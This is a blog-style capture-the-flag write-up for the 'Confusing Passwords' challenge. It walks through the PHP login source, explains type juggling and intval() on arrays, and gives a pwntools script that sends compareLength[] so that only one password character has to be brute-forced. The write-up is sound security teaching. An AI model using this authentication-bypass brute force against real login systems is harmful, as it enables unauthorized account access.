---
title: "Confusing Passwords"
description: "This login system will give you the flag... as long as you can prove you're an admin!"
author: "0x0539"
date: "2023-06-16"
published: true
---

# confusing passwords

[challenge](https://0x0539.net/play/minas_tirith/confusing_passwords)

<aside>
👻  Admin Login
Prove [you're] an admin to access the flag.
</aside>

## overview

the challenge landing page presents us with the login form and the page's source code. its a php-based login form, and the source immediately confirms a handful of credentials:

```php
<?php
  // First check if the player wants to view the source, if so we'll display then kill the page.
  if(isset($_POST["viewsrc"]))
  {
    echo "<pre>";
    echo htmlentities(file_get_contents(basename(__FILE__)));
    echo "</pre>";
    die();
  }

  function checkCredentials($user, $password, $correctUser, $correctPassword, $checkCompareLen)
  {
    if($user != $correctUser)
      return false;

    // Let's ensure the compare length is greater than or equal to the correctPassword size to ensure that
    // it's fully compared.
    if($checkCompareLen < strlen($correctPassword))
      return false;

    // We should also check against an integer overflow
    if($checkCompareLen < 0)
      return false;

    // Finally, compare the passwords
    return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);
  }

  $loginAttempted = false;
  $loginSuccess   = false;

  $correctUsername  = "admin"; // ok
  $correctPassword  = file_get_contents("/adminpwd.txt", FILE_USE_INCLUDE_PATH);

  // :D
  $flag = file_get_contents("/flag.txt", FILE_USE_INCLUDE_PATH);

  // Check that all fields are set before attempting to login
  if(!empty($_POST["username"]) && isset($_POST["password"]) && !empty($_POST["compareLength"]))
  {
    $checkUsername    = $_POST["username"];
    $checkPassword    = $_POST["password"];
    $checkCompareLen  = $_POST["compareLength"];

    $loginAttempted = true;
    $loginSuccess   = checkCredentials($checkUsername, $checkPassword, $correctUsername, $correctPassword, $checkCompareLen);
  }
?>

// [ and then the page's html & css. ]
```

## initial enumeration

upon initial inspection, the above source code indicates that any username entered into the site is checked against the string `admin`. furthermore, the `checkCredentials` function ensures
- all parameters are included in request, and
- the `username` and `compareLength` parameters contain a value.

we can run some requests through burpsuite to modify POST data - this test form gives us a general idea of the intended form functionality - we also see that the default value for `compareLength` is `32`.

![burp_post_test](/img/confusing_passwords_img/burp_post_test.png)

the final line `return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);` is especially interesting here. it looks like the program compares `$password` against `$correctPassword` for each character for a maximum of `intval($checkCompareLen)` characters and returning true if all compared characters match -  if we set `checkCompareLen` to `0` in a POST request, `intval($checkCompareLen)` would be `0`, and we may be able to login without a password.

upon sending a request with `compareLength=0`, we note the lack of a `login failed` warning - feeback that the page isnt processing our request in the same manner as before:

![burp_post_test](/img/confusing_passwords_img/burp_post_test_2.png)

looking at the markup for rendering the `Login failed` warning, we can see that it is displayed if `$loginSuccess != true` AND `$loginAttempted == true`.

i _assume_ that this occurs as `!empty($_POST["compareLength"]))` returns `false` when its value is `0`, and so `$loginAttempted` is not updated to `true` and the banner is not rendered:

```php
<?php
// ...
function checkCredentials($user, $password, $correctUser, $correctPassword, $checkCompareLen)
  {
    if($user != $correctUser)
      return false;
    if($checkCompareLen < strlen($correctPassword))
      return false;
    if($checkCompareLen < 0)
      return false;
    return (strncmp($password, $correctPassword, intval($checkCompareLen)) === 0);
  }
// ...
?>

  // the section in markup where the check to determine if a 'login failed' warning needs to be rendered:

<?php if($loginSuccess) { ?>
    <div class="alert alert-success" role="alert">
        Welcome <?php echo $correctUsername; ?>. Since you've authenticated as an admin, here's the secret flag: <?php echo $flag; ?>
    </div>
    <?php } elseif(!$loginSuccess && $loginAttempted) { ?>     // <-- note the `&&` operator
        <div class="alert alert-danger" role="alert">
            Login failed.
        </div>
<?php } ?>
```

ultimately, this means the page doesnt run checks on our `compareLength` if it is set to `0` in this way.

## vulnerabilities

so to reiterate purely on speculation using the source code:

1. the `username` parameter must be the same value as `$correctUser`, and
2. the posted `compareLength` parameter has to be both:
    1. a positive integer greater than `0`,
    2. a value greater than or equal to the length of `$correctPassword`.

### `username` parameter

we already know from source code that the correct username is `admin`; `username` ultimately doesn't appear to play any further role in authentication, so we can ignore this for now.

instead, we may be able to modify our POST request to pass an unexpected value to the `password` or `compareLength` checks, which may invoke some unexpected behaviour.

we can do this using a vulnerability called `type juggling`, which is a result of a programming language converting different object types to a "common value" when it is asked to run comparisons on them. in PHP, these vulnerabilities are commonly the result of 'loose' comparison operators (e.g., `==`, `!=`), which will compare only the _value_ stored in an object when invoked.

conversely, 'strict' operators (`===`, `!==`, and so on) will also compare the _type_ of each object alongside its value.

### `password` parameter

to explain this in a little more detail - if the page had used a regular `strcmp()` function (as opposed to `str<n>cmp()`) with a loose comparison operator, we could modify the password parameter of a POST request as follows:

```php
// a hypothetical webpage might try to validate a password with a `strcmp()` function, and
// then comparing its returned value to `0`:
return (strcmp($password, $correctPassword) == 0)

// `strcmp()` wants to operate on two string objects, as it will compare each character in each string, incrementing
// the returning value by 1 for each differing character:
return (strcmp("password123", "password123") == 0) // returns `true` as there are 0 different characters.

// in the above example, if we were to make a post request with the following parameters:
username=admin&password[]=

// it would be evaulated as:
return (strcmp(Array(),"real_password123") == 0) // returns `true`; `Array()` == `NULL` == `0`.
// an unexpected array object is determined by `strcmp()` to contain the value `NULL`;
// PHP considers `NULL` to be "loosely" equal to `0`, and so the login form will return `true` under this condition.
```

we are not dealing with the exact functionality as indicated above due to the strict comparison operation, but serves as a simple example - there are a number of type conversions that take place before our input is compared to `0` at the end of the `checkCredentials` function, which leaves significant room for error.

we _also_ get rendered feedback regarding the evaluation of our modified `password` parameter, so we can programmatically use page data to check when the page has run a `strncmp` comparison on our input:

![burp_post_test](/img/confusing_passwords_img/burp_post_test_3.png)

as the password value isn't used in loose operations, however, it isnt feasible to directly trick the form with type juggling.

### `compareLength` parameter

regarding `compareLength`; there are a handful of odd functions performed with the value of this parameter, so we might be able to push through a value that is `> 0`, passes all 'pre-strncmp()' statements, and also results in a low number when the page uses it to index the number of characters to check; even if this were a value like `3` or `4`, the form would be dramatically easier to bruteforce.

### exploit

thankfully, `intval()` is used to convert the data in `compareLength` to an integer; a practice that the [php documenataion **strongly** advises against when dealing with objects](https://www.php.net/manual/en/function.intval.php):

>Returns the int value of value, using the specified base for the conversion (the default is base 10). **intval() should not be used on objects, as doing so will emit an E_WARNING level error and return 1.**

another notable quirk about PHP & arrays (as it related to the page's functionality): array objects are always considered greater than any non-array object (without considering their actual values), so a request with an empty array will pass both the pre-check tests.

so, if we pass an Array to the `compareLength` parameter:

* it will be a larger number than the length of `correctPassword` simply on principle, but
* `intval()` evaluates it as `1`,

so `strncmp()` will only compare the first character in `$correctPassword` and our `password` parameter; meaning we only need to enumerate through one set of valid characters - likely in the realm of a *maximum* of ~52 characters (the first character is likely [`a-Z`]).

we can check that our interpretation of the request is correct by submitting a post request with the `password` and `compareLength` params as arrays; if the page renders the `strncmp` warning, we know that it tried to parse the arrays as strings:

![burp_post_test](/img/confusing_passwords_img/burp_post_test_4.png)

with this theory confirmed, a quick python script using header info from burpsuite to feed into `pwntools`:

1. we make a post request with a malformed `compareLength` parameter,
2. the response is checked against a success condition; failed attempts are ignored,
3. upon finding a successful request, strips irrelevant HTML (based on the markup, we see a successful login will contain '`Welcome <?php echo $correctUsername; ?>. Since you've authenticated as an admin, here's the secret flag: <?php echo $flag; ?>`', though this could just as easily be replace with the opposite operation; something like `if not b'Login failed' in response`):

```python
from pwn import *

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-=+_<>'
charset = [*charset]
for char in charset:
    print(f'trying {char}...')
    r = remote('challenges.0x0539.net',3011)
    r.send('POST /index.php HTTP/1.1\r\n'
            'Content-Length: 42\r\n'
            'Host: challenges.0x0539.net:3011\r\n'
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\r\n'
            'Referer: http://challenges.0x0539.net:3011/index.php\r\n'
            'Content-Type: application/x-www-form-urlencoded\r\n'
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\n'
            'Connection: close\r\n\r\n'
            'username=admin&password={}&compareLength[]='.format(char))

    response = r.recvall()
    if b'the secret flag:' in response: # alternatively, `if not b'Login failed' in response`...
        print(f'\n####### \n\'secret flag\' found in response. trimmed output:')
        print(((response.rsplit(b' Welcome admin.',2)[1]).rsplit(b'</div>\n')[0]).strip())
        print('#######')
        break
```

## flag

running the script, we get a successful login on a POST with `&password=f`:

```lua
┌──(root㉿RUBY)-[/mnt/…/ctf/sites/0x0539/confusing-passwords]
└─# python pass_enum.py
trying a...
/mnt/a/ctf/sites/0x0539/confusing-passwords/pass_enum.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  r.send('POST /index.php HTTP/1.1\r\n'
trying b...
trying c...
trying d...
trying e...
trying f...
#######
'secret flag' found in response. appending trimmed output:

b"Since you've authenticated as an admin, here's the secret flag: FLAG{*redacted*}"
#######
```
